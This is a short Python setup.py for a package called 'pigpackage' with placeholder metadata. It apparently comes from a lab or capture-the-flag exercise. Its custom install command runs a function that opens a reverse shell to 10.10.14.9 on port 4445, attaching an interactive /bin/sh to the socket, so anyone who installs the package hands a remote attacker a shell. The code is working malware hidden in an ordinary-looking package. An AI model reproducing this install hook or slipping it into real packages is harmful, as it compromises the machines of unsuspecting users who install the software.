from distutils.core import setup
from setuptools.command.install import install
import socket, subprocess,os

class PreInstallCommand(install):
	def run(self):
		shell()
		install.run(self)	

def shell():
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("10.10.14.9",4445))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p=subprocess.call(["/bin/sh","-i"])

setup(
  name = 'pigpackage',        
  packages = ['pigpackage'],  
  version = '0.1',      
  license='MIT',       
  description = 'TYPE YOUR DESCRIPTION HERE',   
  author = 'YOUR NAME',                   
  author_email = 'your.email@domain.com',      
  url = 'http://test.com/pigpackage',  
  keywords = ['pigpackage'],   
  cmdclass={'install':PreInstallCommand,},
)


